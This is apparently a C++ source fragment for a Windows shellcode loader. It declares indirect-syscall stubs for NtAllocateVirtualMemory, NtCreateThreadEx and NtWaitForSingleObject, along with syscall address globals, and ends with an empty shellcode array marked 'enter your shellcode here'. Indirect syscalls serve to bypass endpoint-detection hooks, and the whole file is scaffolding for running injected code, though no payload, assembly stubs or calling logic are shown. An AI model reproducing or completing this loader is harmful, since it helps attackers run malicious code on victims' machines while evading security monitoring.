//extern "C" uintptr_t NtOpenProcessSyscall = 0;
//extern "C" uintptr_t NtQuerySystemInformationSyscall = 0;
extern "C" uintptr_t NtCreateThreadExSyscall = 0;
extern "C" uintptr_t NtAllocateVirtualMemorySyscall = 0;
extern "C" uintptr_t NtWaitForSingleObjectSyscall = 0;

extern "C" DWORD SSN = 0;

//typedef CLIENT_ID* PClientId;
//
//extern "C" NTSTATUS NtOpenProcessIndirect(OUT PHANDLE ProcessHandle,
//    IN ACCESS_MASK          AccessMask,
//    IN POBJECT_ATTRIBUTES   ObjectAttributes,
//    IN PClientId            ClientId);
//
//
//
//extern "C" NTSTATUS NtQuerySystemInformationIndirect(
//       SYSTEM_INFORMATION_CLASS SystemInformationClass,
//       PVOID                    SystemInformation,
//       ULONG                    SystemInformationLength,
//       PULONG                   ReturnLength
//);

extern "C" NTSTATUS NtAllocateVirtualMemoryIndirect(
    IN HANDLE    ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG     AllocationType,
    IN ULONG     Protect
    );

extern "C" NTSTATUS NtCreateThreadExIndirect(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList
);

extern "C" NTSTATUS NtWaitForSingleObjectIndirect(
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout
);


unsigned char Shellcode[] = {
   //enter your shellcode here
};


